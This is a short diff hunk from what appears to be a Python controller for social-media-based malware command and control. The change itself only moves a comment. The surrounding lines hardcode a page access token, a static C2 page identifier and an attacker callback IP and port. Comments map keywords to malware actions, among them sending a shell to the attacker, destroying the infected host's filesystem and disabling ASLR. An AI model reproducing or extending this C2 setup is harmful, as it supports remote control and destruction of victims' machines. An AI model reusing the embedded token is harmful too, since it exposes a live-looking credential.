@@ -12,12 +12,12 @@ import matplotlib.pyplot as plt
 PAGE_LONG_ACCESS_TOKEN = 'EAALq5cEcySYBADHemZAiRUqTHaJwjGZAh1pZCBbm3LnLovTgorO7dDPbXZAUu31l8k8TrYBJPaWivcsihd0PfnHTMgdTvNharhxAtToIUAOX4AdgZCJZCGiLLQKbOl5Gj8fkarbbr7K9FL6XY45e7XbpzbAymN5pU3doc3qmzFgwZDZD'
 # The static account to which the malware connects.
 STATIC_C2_PAGE = 'Hammer_6f5902ac237024bdd0c176cb93063dc4'
-# The IP address and port of the attacker who wants to get command output.
 # dog: list users on the system.
 # clam: send shell to attacker.
 # starfish: destroy infected host filesystem.
 # gnat: list network connections.
 # alligator: turn off infected host ASLR.
+# The IP address and port of the attacker who wants to get command output.
 CALLBACK_IP = '127.0.0.1'
 CALLBACK_PORT = 52017
 COMMAND_KEYWORDS = {
